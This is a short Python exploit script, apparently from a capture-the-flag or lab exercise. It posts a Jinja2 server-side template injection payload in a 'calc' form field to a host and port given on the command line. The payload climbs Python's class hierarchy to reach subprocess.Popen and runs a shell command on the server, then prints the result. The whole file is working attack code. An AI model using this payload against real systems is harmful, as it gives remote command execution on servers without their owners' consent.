#!/usr/bin/env python3

import requests
import argparse
import html
import re

parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port", type=int)
args = parser.parse_args()

command = "ls -l"
payload = (
    '{{ [].__class__.__mro__[1].__subclasses__()[352]("%s",shell=True,stdout=-1).communicate()[0].strip() }}'
    % command
)

r = requests.post(f"http://{args.host}:{args.port}/", data={"calc": payload})
response = html.unescape(r.text[8:])
print(response)
